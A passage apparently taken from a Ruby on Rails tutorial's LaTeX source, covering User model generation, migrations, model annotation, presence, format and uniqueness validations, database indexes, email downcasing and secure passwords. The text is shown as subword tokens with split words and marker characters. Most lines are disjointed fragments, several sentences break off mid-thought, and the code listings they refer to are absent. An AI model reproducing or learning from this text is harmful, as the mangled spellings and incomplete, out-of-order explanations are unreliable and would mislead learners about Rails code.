▁To ▁become ▁a ▁Rails ▁\ emph { expert }, ▁you ▁need ▁to ▁understand ▁Ruby ▁more ▁ deep ly , ▁and ▁this ▁book ▁gives ▁you ▁a ▁good ▁foundation ▁for ▁developing ▁that ▁ expert is e .
▁If ▁a ▁helper ▁is ▁specific ▁to ▁a ▁particular ▁controller , ▁you ▁should ▁put ▁it ▁in ▁the ▁corresponding ▁helper ▁file ; ▁for ▁example , ▁helpers ▁for ▁the ▁StaticPages ▁controller ▁generally ▁go ▁in ▁\ k ode { app / helpers / static \_ pages \_ helper . rb }.
▁Update d ▁tests ▁for ▁the ▁Home ▁page ' s ▁title .
▁See ▁if ▁you ▁can ▁ figure ▁out ▁why ▁we ' ve ▁added ▁a ▁new ▁test ▁instead ▁of ▁just ▁alter ing ▁the ▁current ▁one .
▁Note ▁that ▁Ruby ▁functions ▁have ▁an ▁\ emph { implicit ▁return }, ▁meaning ▁they ▁return ▁the ▁last ▁statement ▁evaluated --- in ▁this ▁case , ▁one ▁of ▁the ▁two ▁message ▁strings , ▁depending ▁on ▁whether ▁the ▁method ' s ▁argument ▁\ k ode { string } ▁is ▁empty ▁or ▁not .
▁These ▁sort s ▁of ▁hashes - of - hashes , ▁or ▁\ emph { nested ▁hashes }, ▁are ▁heav ily ▁used ▁by ▁Rails , ▁as ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : signup _ failure }.
▁For ▁example , ▁consider ▁a ▁hash ▁named ▁\ k ode { flash } ▁with ▁keys ▁for ▁two ▁conditions , ▁\ k ode { : success } ▁and ▁\ k ode { : error } :
▁=> ▁ { : success =>" It ▁work ed !" , ▁: error =>" It ▁failed . "}
▁F inally , ▁this ▁data ▁model ▁is ▁a ▁maintain ability ▁ n ight ma re : ▁each ▁time ▁a ▁user ▁changed ▁( s a y ) ▁his ▁name , ▁we ▁would ▁need ▁to ▁update ▁not ▁just ▁the ▁user ' s ▁record ▁in ▁the ▁\ k ode { users } ▁table ▁but ▁also ▁\ emph { ever y ▁row ▁containing ▁that ▁user }< n > in ▁both ▁the ▁\ k ode { followed \_ users } ▁and ▁\ k ode { followers } ▁table s .
▁would ▁try ▁to ▁create ▁the ▁symbol ▁\ k ode { : data - turbolinks - t rack }, ▁which ▁( it ▁turn s ▁out ) ▁is ▁invalid ▁because ▁of ▁the ▁h y phens .
▁This ▁example ▁assume s ▁you ▁are ▁using ▁Ruby ~ 1.9.3 .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁StaticPages ▁controller .
▁Take n ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁This ▁is ▁a ▁long ▁and ▁action - p ac k ed ▁chapter , ▁and ▁you ▁may ▁find ▁it ▁un us u ally ▁challenging , ▁es pecially ▁if ▁you ▁are ▁new ▁to ▁data ▁model ing .
▁By ▁the ▁end ▁of ▁it , ▁though , ▁we ▁will ▁have ▁created ▁an ▁in d us t rial - strength ▁system ▁for ▁valid at ing , ▁storing , ▁and ▁retriev ing ▁user ▁information .
▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁username , ▁we ▁open ▁the ▁the or et ical ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date .
▁By ▁naming ▁the ▁columns ▁in ▁this ▁way , ▁we ' ll ▁let ▁Active ▁Record ▁ figure ▁out ▁the ▁User ▁object ▁attributes ▁for ▁us .
▁Let ' s ▁see ▁how ▁this ▁works .
▁There ▁is ▁an ▁analogous ▁command ▁for ▁making ▁a ▁model : ▁\ k ode { generate ▁model }.
▁create ▁db / migrate / [ timestamp ] _ create _ users . rb
▁invoke ▁ rspec
▁create ▁spec / models / user _ spec . rb
▁( Note ▁that , ▁in ▁contrast ▁to ▁the ▁plural ▁convention ▁for ▁controller ▁names , ▁model ▁names ▁are ▁singular : ▁a ▁Users ▁controller , ▁but ▁a ▁User ▁model .)
▁By ▁passing ▁the ▁optional ▁parameters ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁tell ▁Rails ▁about ▁the ▁two ▁attributes ▁we ▁want , ▁along ▁with ▁what ▁types ▁those ▁attributes ▁should ▁be ▁( in ▁this ▁case , ▁\ k ode { string }).
▁The ▁\ href { http :// sqlite browser . source for ge . net /}{ SQL ite ▁Database ▁B row s er } ▁with ▁our ▁new ▁\ k ode { users } ▁table . ~\ href { http :// railstutorial . org / images / figures / sqlite _ database _ browser - full . png }{ ( full ▁size )}
▁ Most ▁migrations , ▁including ▁all ▁the ▁one s ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁are ▁\ emph { reversible }, ▁which ▁means ▁we ▁can ▁`` migrate ▁down '' ▁and ▁undo ▁them ▁with ▁a ▁single ▁Rake ▁task , ▁called ▁\ k ode { db : rollback } :
▁Before ▁we ▁move ▁on , ▁though , ▁there ▁are ▁two ▁task s ▁to ▁complete .
▁Model ▁an not ation
▁ Adding ▁the ▁\ k ode { annotate } ▁gem ▁to ▁the ▁\ k ode { Gemfile }.
▁( We ▁place ▁the ▁\ k ode { annotate } ▁gem ▁in ▁a ▁\ k ode { group ▁: development } ▁block ▁( an a log ous ▁to ▁\ k ode { group ▁: test }) ▁because ▁the ▁an not ation s ▁are n ' t ▁needed ▁in ▁production ▁applications .)
▁We ▁next ▁install ▁it ▁with ▁\ k ode { bundle ▁install } :
▁This ▁gives ▁us ▁a ▁command ▁called ▁\ k ode { annotate }, ▁which ▁simply ▁add s ▁comments ▁containing ▁the ▁data ▁model ▁to ▁the ▁model ▁file :
▁An not at ed ▁ (1) : ▁User
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : annotate d _ user _ model }.
▁The ▁ annotate d ▁User ▁model .
▁# ▁== ▁S ch e ma ▁In form ation
▁# ▁Table ▁name : ▁users
▁# ▁id ▁: integer ▁not ▁ null , ▁primary ▁key
▁# ▁name ▁: string ( 2 5 5 )
▁# ▁email ▁: string ( 2 5 5 )
▁# ▁created _ at ▁: datetime
▁# ▁updated _ at ▁: datetime
▁I ▁find ▁that ▁ having ▁the ▁data ▁model ▁visible ▁in ▁the ▁model ▁files ▁help s ▁remind ▁me ▁which ▁attributes ▁the ▁model ▁has , ▁but ▁future ▁code ▁list ing s ▁will ▁omit ▁the ▁an not ation s ▁for ▁brevity .
▁( Note ▁that , ▁if ▁you ▁want ▁your ▁an not ation s ▁to ▁be ▁up - to - date , ▁you ' ll ▁have ▁to ▁run ▁\ k ode { annotate } ▁again ▁any ▁time ▁the ▁data ▁model ▁changes .)
▁Access i b le ▁attributes
▁This ▁line ▁tell s ▁Rails ▁which ▁attributes ▁of ▁the ▁model ▁are ▁\ emph { accessible }, ▁i . e . , ▁which ▁attributes ▁can ▁be ▁modified ▁automatically ▁by ▁outside ▁users ▁( such ▁as ▁users ▁ submitting ▁requests ▁with ▁web ▁browsers ).
▁Mak ing ▁the ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes ▁accessible .
▁By ▁default , ▁\ emph { all } ▁model ▁attributes ▁are ▁accessible .
▁If ▁you ' ve ▁been ▁t ailing ▁the ▁development ▁log , ▁you ▁may ▁have ▁notice d ▁that ▁no ▁new ▁lines ▁have ▁show n ▁up ▁yet .
▁This ▁is ▁because ▁calling ▁\ k ode { User . new } ▁does n ' t ▁ touch ▁the ▁database ; ▁it ▁simply ▁creates ▁a ▁new ▁Ruby ▁object ▁in ▁memory .
▁To ▁save ▁the ▁user ▁object ▁to ▁the ▁database , ▁we ▁call ▁the ▁\ k ode { save } ▁method ▁on ▁the ▁\ k ode { user } ▁variable :
▁Because ▁of ▁the ▁many ▁methods ▁supplied ▁by ▁Active ▁Record , ▁we ▁won ' t ▁ever ▁need ▁raw ▁SQL ▁in ▁this ▁book , ▁and ▁I ' ll ▁omit ▁discussion ▁of ▁the ▁SQL ▁commands ▁from ▁now ▁on .
▁created _ at : ▁"2013-03-11 ▁00:57:46" , ▁updated _ at : ▁"2013-03-11 ▁00:57:46" >
▁In ▁case ▁you ' re ▁curious ▁about ▁\ k ode { "2013-0 3- 11 ▁00:57:46" }, ▁I ' m ▁not ▁writing ▁this ▁after ▁ midnight ; ▁the ▁timestamp s ▁are ▁record ed ▁in ▁\ href { http :// en . wiki p edia . org / wiki / Co or d in at ed _ U n ivers al _ Time }{ Co or d in at ed ▁Un ivers al ▁Time } ▁( UT C ), ▁which ▁for ▁most ▁practical ▁purposes ▁is ▁the ▁same ▁as ▁\ href { http :// en . wiki p edia . org / wiki / G re en w ic h _ M e an _ Time }{ G re en w ic h ▁M e an ▁Time }.
▁Note ▁the ▁value ▁of ▁\ k ode { user . updated \_ at }.
▁"2013-03-11 ▁01 : 0 5 : 2 4 ", ▁updated _ at : ▁"2013-03-11 ▁01 : 0 5 : 2 4 ">
▁#< User ▁id : ▁3 , ▁name : ▁" Foo ", ▁email : ▁" foo @ bar . com ", ▁created _ at : ▁"2013-03-11
▁01 : 0 5 : 4 2 ", ▁updated _ at : ▁"2013-03-11 ▁01 : 0 5 : 4 2 ">
▁O d d ly , ▁\ k ode { destroy }, ▁like ▁\ k ode { create }, ▁returns ▁the ▁object ▁in ▁question , ▁though ▁I ▁can ' t ▁recall ▁ever ▁ having ▁used ▁the ▁return ▁value ▁of ▁\ k ode { destroy }.
▁Even ▁odd er , ▁p erhaps , ▁is ▁that ▁the ▁\ k ode { destroy } ed ▁object ▁ still ▁exists ▁in ▁memory :
▁How ▁do ▁we ▁know ▁if ▁we ▁really ▁destroyed ▁an ▁object ?
▁It ' s ▁time ▁to ▁learn ▁how ▁to ▁use ▁Active ▁Record ▁to ▁find ▁user ▁objects .
▁The ▁\ k ode { find \_ by \_ email } ▁method ▁is ▁automatically ▁created ▁by ▁Active ▁Record ▁base d ▁on ▁the ▁\ k ode { email } ▁attribute ▁in ▁the ▁\ k ode { users } ▁table .
▁( As ▁you ▁m ight ▁guess , ▁Active ▁Record ▁creates ▁a ▁\ k ode { find \_ by \_ name } ▁method ▁as ▁well .)
▁Start ing ▁in ▁Rails ~4.0 , ▁the ▁preferred ▁method ▁to ▁find ▁by ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { find \_ by } ▁method ▁instead , ▁passing ▁the ▁attribute ▁as ▁a ▁hash :
▁created _ at : ▁"2013-03-11 ▁00:57:46" , ▁updated _ at : ▁"2013-03-11 ▁00:57:46" > ,
▁"2013-03-11 ▁01 : 0 5 : 2 4 ", ▁updated _ at : ▁"2013-03-11 ▁01 : 0 5 : 2 4 "> ]
▁=> ▁"2013-03-11 ▁00:57:46"
▁=> ▁"2013-03-11 ▁01 : 37 : 3 2 "
▁More over , ▁since ▁we ' ll ▁be ▁using ▁email ▁addresses ▁as ▁unique ▁username s ▁when ▁users ▁sign ▁in , ▁we ▁should n ' t ▁allow ▁email ▁duplicate s ▁in ▁the ▁database .
▁Active ▁Record ▁allows ▁us ▁to ▁i mp o se ▁such ▁constraints ▁using ▁\ emph { validations }.
▁And ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : signup _ failure } ▁how ▁validations ▁give ▁us ▁convenient ▁error ▁messages ▁when ▁users ▁make ▁submission s ▁that ▁violat e ▁them .
▁As ▁with ▁the ▁other ▁features ▁of ▁our ▁sample ▁app , ▁we ' ll ▁add ▁User ▁model ▁validations ▁using ▁test - driven ▁development .
▁Because ▁we ▁did n ' t ▁pass ▁the
▁The ▁practical ly ▁blank ▁default ▁User ▁spec .
▁This ▁simply ▁uses ▁the ▁\ k ode { pending } ▁method ▁to ▁indicate ▁that ▁we ▁should ▁fill ▁the ▁spec ▁with ▁something ▁useful .
▁We ▁can ▁see ▁its ▁effect ▁by ▁prepar ing ▁a ▁( blank ) ▁test ▁database ▁and ▁running ▁the ▁User ▁model ▁spec :
▁F in is h ed ▁in ▁0.0 19 99 ▁second s
▁1 ▁example , ▁0 ▁failure s , ▁1 ▁ pending
▁P end ing :
▁< n > ▁User ▁add ▁some ▁examples ▁to ▁( or ▁delete )
▁< n > ▁/ Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec . rb
▁< n > ▁( N o t ▁ Y et ▁Implement ed )
▁On ▁many ▁systems , ▁ pending ▁spec s ▁will ▁be ▁displayed ▁in ▁ y el low ▁to ▁indicate ▁that ▁they ▁are ▁in ▁between ▁passing ▁( g re en ) ▁and ▁failing ▁( r ed ).
▁This ▁is ▁the ▁first ▁time ▁we ' ve ▁seen ▁the ▁command ▁to ▁create ▁a ▁test ▁database ▁with ▁the ▁correct ▁structure :
▁( F a il ure ▁to ▁run ▁this ▁Rake ▁task ▁after ▁a ▁migration ▁is ▁a ▁common ▁source ▁of ▁confusion .
▁In ▁addition , ▁some times ▁the ▁test ▁database ▁get s ▁co r r up t ed ▁and ▁needs ▁to ▁be ▁reset .
▁If ▁your ▁test ▁suite ▁is ▁mysterious ly ▁break ing , ▁be ▁sure ▁to ▁try ▁running ▁\ k ode { rake ▁test : prepare } ▁to ▁see ▁if ▁that ▁fix es ▁the ▁problem .)
▁in ▁Listing ~\ ref { code : user _ spec }.
▁Testing ▁for ▁the ▁\ k ode { : name } ▁and ▁\ k ode { : email } ▁attributes .
▁The ▁tests ▁themselves ▁rely ▁on ▁the ▁\ emph { boolean ▁convention } ▁used ▁by ▁RSpec : ▁the ▁code
▁can ▁be ▁test ed ▁using ▁the ▁RSpec ▁code
▁These ▁kind s ▁of ▁tests ▁allow ▁us ▁to ▁use ▁ TDD ▁to ▁add ▁new ▁attributes ▁and ▁methods ▁to ▁our ▁User ▁model , ▁and ▁as ▁a ▁side - e ffect ▁we ▁get ▁a ▁nice ▁specific ation ▁for ▁the ▁methods ▁that ▁all ▁\ k ode { User } ▁objects ▁should ▁respond ▁to .
▁Because ▁we ▁have ▁already ▁properly ▁prepared ▁the ▁test ▁database ▁with ▁\ k ode { rake ▁test : prepare }, ▁the ▁tests ▁should ▁pass :
▁We ' ll ▁start ▁with ▁a ▁test ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute .
▁Then ▁we ' ll ▁comment ▁out ▁the ▁validation , ▁write ▁a ▁failing ▁test , ▁and ▁verify ▁that ▁uncomment ing ▁the ▁validation ▁get s ▁the ▁test ▁to ▁pass .
▁This ▁ procedure ▁may ▁seem ▁ ped ant ic ▁for ▁such ▁a ▁simple ▁test , ▁but ▁I ▁have ▁seen ▁many ▁`` simple '' ▁tests ▁that ▁actually ▁test ▁the ▁wrong ▁thing ; ▁being ▁me tic ul ous ▁about ▁ TDD ▁is ▁simply ▁the ▁\ emph { only } ▁way ▁to ▁be ▁confident ▁that ▁we ' re ▁testing ▁the ▁right ▁thing .
▁( This ▁comment - out ▁technique ▁is ▁also ▁useful ▁when ▁re sc u ing ▁an ▁application ▁who se ▁application ▁code ▁is ▁already ▁written ▁but --- \ href { http :// en . w i k t ion ary . org / wiki / q ue ll e _ h or re ur }{\ emph { q ue ll e ▁h or re ur ! } }--- has ▁no ▁tests .)
▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name }.
▁Here ▁\ k ode { user . save } ▁returns ▁\ k ode { false }, ▁indicat ing ▁a ▁failed ▁save .
▁In ▁the ▁final ▁command , ▁we ▁use ▁the ▁\ k ode { valid ?}\ ▁method , ▁which ▁returns ▁\ k ode { false } ▁when ▁the ▁object ▁fails ▁one ▁or ▁more ▁validations , ▁and ▁\ k ode { true } ▁when ▁all ▁validations ▁pass .
▁ Comment ing ▁out ▁a ▁validation ▁to ▁ensure ▁a ▁failing ▁test .
▁# ▁validates ▁: name , ▁presence : ▁true
▁in ▁Listing ~\ ref { code : failing _ validates _ name _ spec }.
▁A ▁failing ▁test ▁for ▁validation ▁of ▁the ▁\ k ode { name } ▁attribute .
▁The ▁first ▁new ▁example ▁is ▁just ▁a ▁sanit y ▁check , ▁verify ing ▁that ▁the ▁subject ▁(\ k ode {@ user }) ▁is ▁initially ▁valid :
▁In ▁this ▁case , ▁we ▁can ▁test ▁the ▁result ▁of ▁calling
▁The ▁second ▁test ▁first ▁set s ▁the ▁user ' s ▁name ▁to ▁an ▁invalid ▁( blank ) ▁value , ▁and ▁the n ▁tests ▁to ▁see ▁that ▁the ▁result ing ▁\ k ode {@ user } ▁object ▁is ▁invalid :
▁This ▁uses ▁a ▁\ k ode { before } ▁block ▁to ▁set ▁the ▁user ' s ▁name ▁to ▁an ▁invalid ▁( blank ) ▁value ▁and ▁the n ▁check s ▁that ▁the ▁result ing ▁user ▁object ▁is ▁not ▁valid .
▁You ▁should ▁verify ▁that ▁the ▁tests ▁fail ▁at ▁this ▁point :
▁4 ▁examples , ▁1 ▁failure
▁4 ▁examples , ▁0 ▁failure s
▁Of ▁course , ▁we ▁also ▁want ▁to ▁validate ▁the ▁presence ▁of ▁email ▁addresses .
▁A ▁test ▁for ▁presence ▁of ▁the ▁\ k ode { email } ▁attribute .
▁as ▁seen ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ email }.
▁Validat ing ▁the ▁presence ▁of ▁the ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes .
▁Now ▁all ▁the ▁tests ▁should ▁pass , ▁and ▁the ▁presence ▁validations ▁are ▁complete .
▁Ou r ▁validations ▁for ▁the ▁\ k ode { name } ▁attribute ▁enforce ▁only ▁minimal ▁constraints --- any ▁non - blank ▁name ▁under ▁5 1 ▁characters ▁will ▁do --- but ▁of ▁course ▁the ▁\ k ode { email } ▁attribute ▁must ▁ satisf y ▁more ▁string ent ▁requirements .
▁We ' ll ▁start ▁with ▁a ▁couple ▁tests ▁ involving ▁collection s ▁of ▁valid ▁and ▁invalid ▁addresses .
▁=> ▁[" user @ foo .
▁C O M ▁A _ U S - ER @ f . b . org ▁f r st . l st @ foo . j p ▁a + b @ baz . c n ]
▁So , ▁where ▁does ▁the ▁pattern ▁come ▁from ?
▁case ▁ insensitive
▁By ▁the ▁way , ▁there ▁actually ▁exists ▁a ▁full ▁regex ▁for ▁matching ▁email ▁addresses ▁according ▁to ▁the ▁of fi cial ▁standard , ▁but ▁it ' s ▁really ▁not ▁worth ▁the ▁trouble .
▁D id ▁you ▁know ▁that ▁\ k ode {" Michael ▁Hartl " @ example . com }, ▁with ▁ quot ation ▁mark s ▁and ▁a ▁ space ▁in ▁the ▁m id d le , ▁is ▁a ▁valid ▁email ▁address ▁according ▁to ▁the ▁standard ?
▁The ▁expression ▁above ▁does ▁have ▁one ▁we a k n es s , ▁though : ▁it ▁allows ▁invalid ▁addresses ▁such ▁as ▁\ k ode { foo @ bar . . com } ▁that ▁contain ▁con sec u tive ▁do t s .
▁The ▁a we some ▁\ href { http :// www . rubular . com /}{ Rubular } ▁regular ▁expression ▁editor . ~\ href { http :// railstutorial . org / images / figures / rubular - full . png }{ ( full ▁size )}
▁The ▁tests ▁should ▁all ▁be ▁passing ▁now .
▁( In ▁fact , ▁the ▁tests ▁for ▁valid ▁email ▁addresses ▁should ▁have ▁been ▁passing ▁all ▁along ; ▁since ▁regex es ▁are ▁not or ious ly ▁error - prone , ▁the ▁valid ▁email ▁tests ▁are ▁there ▁main ly ▁as ▁a ▁sanit y ▁check ▁on ▁\ k ode { VALID \_ EMAIL \_ RE G E X }. )
▁This ▁means ▁that ▁there ' s ▁only ▁one ▁constraint ▁left : ▁enforc ing ▁the ▁email ▁addresses ▁to ▁be ▁unique .
▁We ' ll ▁start , ▁as ▁usual , ▁with ▁our ▁tests .
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ test }.
▁The ▁method ▁here ▁is ▁to ▁make ▁a ▁user ▁with ▁the ▁same ▁email ▁address ▁as ▁\ k ode {@ user }, ▁which ▁we ▁accomplish ▁using ▁\ k ode {@ user . dup }, ▁which ▁creates ▁a ▁duplicate ▁user ▁with ▁the ▁same ▁attributes . ▁S ince ▁we ▁the n ▁save ▁that ▁user , ▁the ▁original ▁\ k ode {@ user } ▁has ▁an ▁email ▁address ▁that ▁already ▁exists ▁in ▁the ▁database , ▁and ▁hence ▁should ▁not ▁be ▁valid .
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email }.
▁ Technical ly , ▁only ▁the ▁domain ▁part ▁of ▁the ▁email ▁address ▁is ▁case - insensitive : ▁ foo @ bar . com ▁is ▁actually ▁different ▁from ▁ Foo @ bar . com .
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test }.
▁A ▁test ▁for ▁the ▁reject ion ▁of ▁duplicate ▁email ▁addresses , ▁ insensitive ▁to ▁case .
▁This ▁test ▁does ▁the ▁same ▁thing ▁as ▁the ▁first ▁duplicate ▁email ▁test , ▁but ▁with ▁an ▁upper - case ▁email ▁address ▁instead .
▁Of ▁course , ▁\ k ode { user \_ with \_ s a me \_ email . valid ?}\ ▁is ▁\ k ode { true }, ▁because ▁the ▁uniqueness ▁validation ▁is ▁current ly ▁case - sensitive , ▁but ▁we ▁want ▁it ▁to ▁be ▁\ k ode { false }.
▁Note ▁that ▁we ▁have ▁simply ▁replaced ▁\ k ode { true } ▁with ▁\ k ode { case \_ sensitive : ▁false } ; ▁Rails ▁infer s ▁in ▁this ▁case ▁that ▁\ k ode { : uniqueness } ▁should ▁be ▁\ k ode { true }.
▁At ▁this ▁point , ▁our ▁application --- with ▁an ▁important ▁caveat --- en force s ▁email ▁uniqueness , ▁and ▁our ▁test ▁suite ▁should ▁pass .
▁There ' s ▁just ▁one ▁small ▁problem , ▁the ▁caveat ▁all u d ed ▁to ▁above :
▁Using ▁\ k ode { validates ▁: uniqueness } ▁does ▁not ▁guarantee ▁uniqueness .
▁But ▁what ▁can ▁go ▁wrong ?
▁Here ' s ▁what :
▁If ▁the ▁above ▁sequence ▁seem s ▁i mp la us i b le , ▁believe ▁me , ▁it ▁is n ' t : ▁it ▁can ▁happen ▁on ▁any ▁Rails ▁website ▁with ▁significant ▁traffic .
▁L uckily , ▁the ▁solution ▁is ▁straightforward ▁to ▁implement ; ▁we ▁just ▁need ▁to ▁enforce ▁uniqueness ▁at ▁the ▁database ▁level ▁as ▁well .
▁Ou r ▁method ▁is ▁to ▁create ▁a ▁database ▁\ emph { index } ▁on ▁the ▁email ▁column , ▁and ▁the n ▁require ▁that ▁the ▁index ▁be ▁unique .
▁The ▁Rails ▁Way ▁is ▁to ▁use ▁migrations ▁every ▁time ▁we ▁ discover ▁that ▁our ▁data ▁model ▁needs ▁to ▁change .
▁U nfortunately , ▁there ' s ▁one ▁more ▁change ▁we ▁need ▁to ▁make ▁to ▁be ▁as s ur ed ▁of ▁email ▁uniqueness , ▁which ▁is ▁to ▁make ▁sure ▁that ▁the ▁email ▁address ▁is ▁all ▁lower - case ▁before ▁it ▁get s ▁saved ▁to ▁the ▁database .
▁The ▁reason ▁is ▁that ▁not ▁all ▁database ▁adapter s ▁use ▁case - sensitive ▁indices
▁D ir ec t ▁ ex p er i ment ation ▁with ▁SQLite ▁on ▁my ▁system ▁and ▁PostgreSQL ▁on ▁Heroku ▁show ▁that ▁this ▁step ▁is , ▁in ▁fact , ▁necessary .
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁a ▁\ href { http :// en . wiki p edia . org / wiki / C all back _ ( computer _ science ) }{\ emph { callback } }, ▁which ▁is ▁a ▁method ▁that ▁get s ▁invoked ▁at ▁a ▁particular ▁point ▁in ▁the ▁life time ▁of ▁an ▁Active ▁Record ▁object ▁( see ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 0 . 0 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks }).
▁as ▁show n ▁in ▁Listing ~\ ref { code : email _ downcase }.
▁Now ▁the ▁A li ce ▁scenario ▁above ▁will ▁work ▁fine : ▁the ▁database ▁will ▁save ▁a ▁user ▁record ▁base d ▁on ▁the ▁first ▁request , ▁and ▁will ▁reject ▁the ▁second ▁save ▁for ▁violat ing ▁the ▁uniqueness ▁constraint .
▁( A n ▁error ▁will ▁appear ▁in ▁the ▁Rails ▁log , ▁but ▁that ▁does n ' t ▁do ▁any ▁harm .
▁In ▁a ▁book , ▁to ▁find ▁all ▁the ▁occur r ence s ▁of ▁a ▁given ▁string , ▁say ▁`` foobar '' , ▁you ▁would ▁have ▁to ▁ s can ▁each ▁page ▁for ▁`` foobar ''.
▁In ▁this ▁section , ▁we ' ll ▁add ▁the ▁last ▁of ▁the ▁basic ▁User ▁attributes : ▁a ▁secure ▁password ▁used ▁to ▁authenticate ▁users ▁of ▁the ▁sample ▁application .
▁M u ch ▁of ▁the ▁secure ▁password ▁machinery ▁will ▁be ▁implemented ▁using ▁a ▁single ▁Rails ▁method ▁called ▁\ k ode { has \_ secure \_ password } ▁( first ▁introduce d ▁in ▁Rails ~3 . 1 ).
▁Because ▁so ▁much ▁of ▁what ▁follows ▁depend s ▁on ▁this ▁one ▁method , ▁it ▁is ▁difficult ▁to ▁develop ▁secure ▁passwords ▁increment ally .
▁( S ince ▁screencasts ▁allow ▁for ▁a ▁more ▁increment al ▁development ▁approach , ▁interest ed ▁readers ▁should ▁consider ▁the ▁\ href { http :// railstutorial . org / screencasts }{ Ruby ▁on ▁Rails ▁Tutorial ▁screencasts } ▁for ▁a ▁full er ▁understanding ▁of ▁this ▁material .)
▁On ▁some ▁systems , ▁you ▁may ▁get ▁the ▁warning
▁make : ▁/ us r / bin / g cc - 4 . 2 : ▁No ▁such ▁file ▁or ▁directory
▁To ▁fix ▁this , ▁re install ▁RVM ▁using ▁the ▁\ k ode { c lang } ▁flag :
▁in ▁Listing ~\ ref { code : respond _ to _ password _ digest }.
▁Ensur ing ▁that ▁a ▁User ▁object ▁has ▁a ▁\ k ode { password \_ digest } ▁column .
▁To ▁get ▁the ▁test ▁to ▁pass , ▁we ▁first ▁generate ▁an ▁appropriate ▁migration ▁for ▁the ▁\ k ode { password \_ digest } ▁column :
▁Here ▁the ▁first ▁argument ▁is ▁the ▁migration ▁name , ▁and ▁we ' ve ▁also ▁supplied ▁a ▁second ▁argument ▁with ▁the ▁name ▁and ▁type ▁of ▁attribute ▁we ▁want ▁to ▁create .
▁in ▁Listing ~\ ref { code : generate _ user _ model }.
▁We ▁can ▁choose ▁any ▁migration ▁name ▁we ▁want , ▁but ▁it ' s ▁convenient ▁to ▁end ▁the ▁name ▁with ▁\ k ode { \_ to \_ users }, ▁since ▁in ▁this ▁case ▁Rails ▁automatically ▁construct s ▁a ▁migration ▁to ▁add ▁columns ▁to ▁the ▁\ k ode { users } ▁table .
▁This ▁code ▁uses ▁the ▁\ k ode { add \_ column } ▁method ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁from ▁Listing ~\ ref { code : respond _ to _ password _ digest } ▁to
▁We ▁could ▁enforce ▁this ▁at ▁the ▁controller ▁layer , ▁but ▁it ' s ▁conventional ▁to ▁put ▁it ▁in ▁the ▁model ▁and ▁use ▁Active ▁Record ▁to ▁enforce ▁the ▁constraint .
▁The ▁method ▁is ▁to ▁add ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes ▁to ▁the ▁User ▁model , ▁and ▁the n ▁require ▁that ▁the ▁two ▁attributes ▁match ▁before ▁the ▁record ▁is ▁saved ▁to ▁the ▁database .
▁Un like ▁the ▁other ▁attributes ▁we ' ve ▁seen ▁so ▁far , ▁the ▁password ▁attributes ▁will ▁be ▁\ emph { v ir t u al }--- the y ▁will ▁only ▁exist ▁t emporarily ▁in ▁memory , ▁and ▁will ▁not ▁be ▁persist ed ▁to ▁the ▁database .
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ respond _ to _ password }.
▁Testing ▁for ▁the ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes .
▁Note ▁that ▁we ' ve ▁added ▁\ k ode { : password } ▁and ▁\ k ode { : password \_ confirmation } ▁to ▁the ▁initialization ▁hash ▁for ▁\ k ode { User . new } :
▁We ▁defin ite ly ▁don ' t ▁want ▁users ▁to ▁enter ▁a ▁blank ▁password , ▁so ▁we ' ll ▁add ▁another ▁test ▁to ▁validate ▁password ▁presence :
▁S ince ▁we ' ll ▁be ▁testing ▁password ▁m is match ▁in ▁a ▁moment , ▁here ▁we ▁make ▁sure ▁to ▁test ▁the ▁\ emph { presence } ▁validation ▁by ▁setting ▁both ▁the ▁password ▁and ▁its ▁confirmation ▁to ▁a ▁blank ▁string .
▁We ▁also ▁want ▁to ▁ensure ▁that ▁the ▁password ▁and ▁confirmation ▁match .
▁in ▁Listing ~\ ref { code : password _ tests }.
▁ Test ▁for ▁the ▁password ▁and ▁password ▁confirmation .
▁as ▁show n ▁in ▁Listing ~\ ref { code : initial _ passing _ password _ tests }.
▁ Getting ▁the ▁initial ▁password ▁tests ▁to ▁pass .
▁get s ▁all ▁of ▁the ▁current ▁password ▁tests ▁to ▁pass , ▁and ▁it ▁does ▁a ▁lot ▁more ▁be side s .
▁ Comment ing ▁out ▁\ k ode { has \_ secure \_ password } ▁for ▁the ▁ s a k e ▁of ▁ TDD .
▁# ▁has _ secure _ password
▁The ▁final ▁piece ▁of ▁our ▁password ▁machinery ▁is ▁a ▁method ▁to ▁retrieve ▁users ▁base d ▁on ▁their ▁email ▁and ▁passwords .
▁This ▁ div id es ▁natural ly ▁into ▁two ▁parts : ▁first , ▁find ▁a ▁user ▁by ▁email ▁address ; ▁second , ▁authenticate ▁the ▁user ▁with ▁a ▁given ▁password .
▁The ▁second ▁step ▁is ▁the n ▁to ▁use ▁an ▁\ k ode { authenticate } ▁method ▁to ▁verify ▁that ▁the ▁user ▁has ▁the ▁given ▁password .
